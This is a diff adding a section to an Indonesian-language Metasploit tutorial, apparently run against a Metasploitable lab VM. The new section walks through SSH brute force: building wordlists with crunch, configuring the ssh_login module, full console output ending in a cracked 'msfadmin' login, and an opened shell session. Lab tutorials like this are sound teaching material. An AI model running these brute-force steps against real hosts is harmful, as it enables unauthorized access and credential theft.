@@ -1909,4 +1909,149 @@ msf6 exploit(multi/samba/usermap_script) > exploit
 [*] Command shell session 1 opened (192.168.1.21:4444 -> 192.168.1.22:57480) at 2024-12-15 21:58:25 +0800
 ```
 
-Banggg......!!! berhasil.
+Banggg......!!! berhasil. Jika cara di atas tidak berhasil untuk mencari versi eksploit atau exploit itu sendiri, kita bisa menggunakan jalan terakhir dengan menggunakan google.
+
+__Brutoforce attack SSH__
+
+Dalam dunia nyata, yang perlu disiapkan sebelum adalah brutoforce adalah wordlist. Di Kali Linux tool yang dapat digunakan untuk membuat wordlist adalah `crunch`.
+
+Membuat wordlist minimal 6 karakter maksimal 8 karakter dan disimpan dalam `user-list.txt` file.
+
+```bash
+crunch 6 8 -o user-list.txt
+```
+Contoh menambahkan spesifik karakter yang akan dibuat dalam wordlist
+
+```bash
+crunch 8 8 msifadn -o user-list.txt
+```
+
+Module yang akan kita gunakan untuk bruto force ssh adalah `ssh_login.rb`yang  berada di `/usr/share/metasploit-framework/modules/auxiliary/scanner/ssh`.
+
+Jalankan metasploit sekaligus memasukan option konfigurasi:
+
+```bash
+$ msfconsole 
+Metasploit tip: The use command supports fuzzy searching to try and 
+select the intended module, e.g. use kerberos/get_ticket or use 
+kerberos forge silver ticket
+                                                  
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .                                                             
+             ' @@@ @@   @@    ,                                                              
+              `.@@@@    @@   .                                                               
+                ',@@     @   ;           _____________                                       
+                 (   3 C    )     /|___ / Metasploit! \                                      
+                 ;@'. __*__,."    \|--- \_____________/                                      
+                  '(.,...."/                                                                 
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 >
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and
+                                                password
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   CreateSession     true             no        Create a new session for every successful l
+                                                ogin
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the
+                                                 current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database t
+                                                o the list
+   DB_ALL_USERS      false            no        Add all users in the current database to th
+                                                e list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the cur
+                                                rent database (Accepted: none, user, user&r
+                                                ealm)
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target host(s), see https://docs.metasp
+                                                loit.com/docs/using-metasploit/basics/using
+                                                -metasploit.html
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a
+                                                 host
+   THREADS           1                yes       The number of concurrent threads (max one p
+                                                er host)
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separat
+                                                ed by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all us
+                                                ers
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           false            yes       Whether to print output for all attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.22
+RHOSTS => 192.168.1.22
+msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /home/ucup/Desktop/username.txt
+USER_FILE => /home/ucup/Desktop/username.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/ucup/Desktop/password.txt
+PASS_FILE => /home/ucup/Desktop/password.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
+VERBOSE => true
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 192.168.1.22:22 - Starting bruteforce
+[-] 192.168.1.22:22 - Failed: 'msfadmif:msfadmii'
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.1.22:22 - Failed: 'msfadmif:msfadmif'
+[-] 192.168.1.22:22 - Failed: 'msfadmif:msfadmia'
+[-] 192.168.1.22:22 - Failed: 'msfadmif:msfadmid'
+[-] 192.168.1.22:22 - Failed: 'msfadmif:msfadmin'
+...
+[-] 192.168.1.22:22 - Failed: 'msfadmin:msfadmid'
+[+] 192.168.1.22:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
+[*] SSH session 1 opened (192.168.1.21:35813 -> 192.168.1.22:22) at 2024-12-16 23:11:46 +0800
+[-] 192.168.1.22:22 - Failed: 'msfadmfm:msfadmii'
+[-] 192.168.1.22:22 - Failed: 'msfadmfm:msfadmif'
+...
+[-] 192.168.1.22:22 - Failed: 'msfadmfs:'
+[-] 192.168.1.22:22 - Failed: 'msfadmfi:'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Dari output diatas ketika metasploit mendapatkan username dan password ssh, metasploit akan membuka session baru, kita bisa melihat session yang terbuka dan bisa langsung digunakan.
+
+```bash
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type         Information  Connection
+  --  ----  ----         -----------  ----------
+  1         shell linux  SSH ucup @   192.168.1.21:35813 -> 192.168.1.22:22 (192.168.1.22)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
+
+[*] Starting interaction with 1...
+```
+
+Banggg!!!!. Berhasil.
+
+
